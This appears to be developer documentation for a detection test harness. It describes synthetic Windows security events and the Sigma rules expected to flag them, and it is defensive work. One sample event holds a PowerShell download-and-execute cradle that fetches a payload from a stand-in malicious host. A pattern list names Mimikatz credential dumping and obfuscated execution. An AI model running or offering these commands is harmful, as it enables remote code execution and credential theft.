# Test Event Reference

This document describes the test events generated by `test_otel_events.sh` and their expected Sigma rule matches.

## Event Types

### 1. Failed Login (EventID 4625)
**Frequency**: 40% of events
**Severity**: WARN
**Channel**: Security

**Sample Event**:
```json
{
  "EventID": 4625,
  "Channel": "Security",
  "EventData": {
    "TargetUserName": "user42",
    "IpAddress": "192.168.1.150",
    "FailureReason": "Bad password"
  }
}
```

**Expected Sigma Match**:
- Rule: Failed Authentication
- Severity: Medium/High
- Description: Multiple failed login attempts detected

**MITRE ATT&CK**: T1110 - Brute Force

---

### 2. Mimikatz Detection (EventID 10)
**Frequency**: 15% of events
**Severity**: CRITICAL
**Channel**: Microsoft-Windows-Sysmon/Operational

**Sample Event**:
```json
{
  "EventID": 10,
  "Channel": "Microsoft-Windows-Sysmon/Operational",
  "EventData": {
    "SourceImage": "C:\\Users\\admin\\mimikatz.exe",
    "TargetImage": "C:\\Windows\\System32\\lsass.exe",
    "GrantedAccess": "0x1010",
    "SourceProcessId": "5432"
  }
}
```

**Expected Sigma Match**:
- Rule: Credential Dumping via Mimikatz
- Severity: Critical
- Description: LSASS process memory access by suspicious process

**MITRE ATT&CK**: T1003.001 - OS Credential Dumping: LSASS Memory

---

### 3. Suspicious PowerShell (EventID 4104)
**Frequency**: 20% of events
**Severity**: ERROR
**Channel**: Microsoft-Windows-PowerShell/Operational

**Sample Event**:
```json
{
  "EventID": 4104,
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')",
  "Path": "C:\\Users\\admin\\malicious.ps1"
}
```

**Script Patterns**:
- `IEX (New-Object Net.WebClient).DownloadString(...)` - Download cradle
- `Invoke-Mimikatz -DumpCreds` - Credential dumping
- `powershell -encodedcommand ...` - Encoded command execution
- `Invoke-Expression $(New-Object IO.StreamReader...` - Obfuscated execution

**Expected Sigma Match**:
- Rule: Suspicious PowerShell Script Execution
- Severity: High
- Description: PowerShell script with malicious patterns detected

**MITRE ATT&CK**: T1059.001 - Command and Scripting Interpreter: PowerShell

---

### 4. Privilege Escalation (EventID 4728)
**Frequency**: 15% of events
**Severity**: ERROR
**Channel**: Security

**Sample Event**:
```json
{
  "EventID": 4728,
  "Channel": "Security",
  "EventData": {
    "MemberName": "user35",
    "TargetUserName": "Administrators",
    "SubjectUserName": "admin"
  }
}
```

**Expected Sigma Match**:
- Rule: User Added to Privileged Group
- Severity: High
- Description: User account added to Administrators group

**MITRE ATT&CK**: T1078.002 - Valid Accounts: Domain Accounts

---

### 5. Lateral Movement (EventID 4624)
**Frequency**: 10% of events
**Severity**: WARN
**Channel**: Security

**Sample Event**:
```json
{
  "EventID": 4624,
  "Channel": "Security",
  "EventData": {
    "TargetUserName": "admin2",
    "IpAddress": "10.0.0.150",
    "LogonType": "3",
    "AuthenticationPackageName": "NTLM"
  }
}
```

**Expected Sigma Match**:
- Rule: Lateral Movement via Network Logon
- Severity: Medium
- Description: NTLM network logon from internal IP

**MITRE ATT&CK**: T1021 - Remote Services

---

## Testing Matrix

| Event Type | EventID | Should Match Rule | Current Status |
|------------|---------|-------------------|----------------|
| Failed Login | 4625 | Failed Authentication | ✅ Hardcoded |
| Mimikatz | 10 | Credential Dumping | ⏳ Pending Sigma integration |
| PowerShell | 4104 | Suspicious Script | ⏳ Pending Sigma integration |
| Privilege Escalation | 4728 | Privilege Escalation | ⏳ Pending Sigma integration |
| Lateral Movement | 4624 | Lateral Movement | ⏳ Pending Sigma integration |

---

## Validation Checklist

After running `./test_otel_events.sh`, verify:

- [ ] Events appear in ClickHouse `logs_v2` table
- [ ] Security analyzer processes events (check logs)
- [ ] Alerts generated for EventID 4625 (currently hardcoded)
- [ ] Alerts sent to Keep platform successfully
- [ ] Alert deduplication working (no duplicate alerts within 5 minutes)
- [ ] Rate limiting enforced (max 100 alerts/minute)

---

## Expected Alert Volume

For 100 generated events:
- **~40 alerts** for failed logins (EventID 4625) - Currently active
- **~15 alerts** for mimikatz detection - After Sigma integration
- **~20 alerts** for PowerShell - After Sigma integration
- **~15 alerts** for privilege escalation - After Sigma integration
- **~10 alerts** for lateral movement - After Sigma integration

**Note**: Actual alert count may be lower due to deduplication (300s window).

---

## Troubleshooting

### No Events in ClickHouse
```bash
# Check OTEL collector is running
docker ps | grep otel-collector

# Check collector logs
docker logs otel-collector

# Verify network connectivity
curl -X POST http://localhost:4318/v1/logs -d '{}'
```

### No Alerts Generated
```bash
# Check security-analyzer is running
docker ps | grep security-log-analyzer

# Check logs for errors
docker-compose logs security-analyzer | grep -i error

# Verify field mapping
docker-compose logs security-analyzer | grep "Applying.*mappings"

# Check rule evaluation
docker-compose logs security-analyzer | grep "Generated.*alerts"
```

### Alerts Not Reaching Keep
```bash
# Check webhook configuration
grep keep_webhook_url config/config.yaml

# Check API key is set
docker-compose logs security-analyzer | grep "API key.*configured"

# Check for webhook errors
docker-compose logs security-analyzer | grep "Failed to send alert"

# Test webhook manually
curl -X POST https://api.keephq.dev/alerts/event \
  -H "X-API-KEY: your-key" \
  -H "Content-Type: application/json" \
  -d '{"source": "test", "severity": "high", "text": "Test alert"}'
```

---

## Custom Test Scenarios

### High Volume Load Test
```bash
# Generate 1000 events
./test_otel_events.sh 1000

# Monitor alert rate limiting
docker-compose logs -f security-analyzer | grep "rate limit"
```

### Deduplication Test
```bash
# Generate 50 events in quick succession
./test_otel_events.sh 50

# Wait 30 seconds
sleep 30

# Generate another 50 events (should deduplicate)
./test_otel_events.sh 50

# Check deduplication stats
docker-compose logs security-analyzer | grep "Skipping duplicate alert"
```

### Specific Event Type Test
Edit the `EVENT_TYPES` array in `test_otel_events.sh`:
```bash
# Test only failed logins
EVENT_TYPES=(
    "failed_login:100"
)
```

---

## Integration with CI/CD

Example GitHub Actions workflow:

```yaml
name: Test Security Analysis

on: [push, pull_request]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Start services
        run: |
          docker-compose up -d
          sleep 10

      - name: Generate test events
        run: ./test_otel_events.sh 100

      - name: Wait for processing
        run: sleep 15

      - name: Verify alerts generated
        run: |
          alert_count=$(docker-compose logs security-analyzer | grep -c "Alert sent successfully" || true)
          if [ $alert_count -lt 10 ]; then
            echo "Expected at least 10 alerts, got $alert_count"
            exit 1
          fi

      - name: Check logs
        if: failure()
        run: docker-compose logs
```

---

## References

- [Sigma Rules Repository](https://github.com/SigmaHQ/sigma)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [OpenTelemetry Logs](https://opentelemetry.io/docs/specs/otel/logs/)
- [Keep Platform](https://www.keephq.dev/)
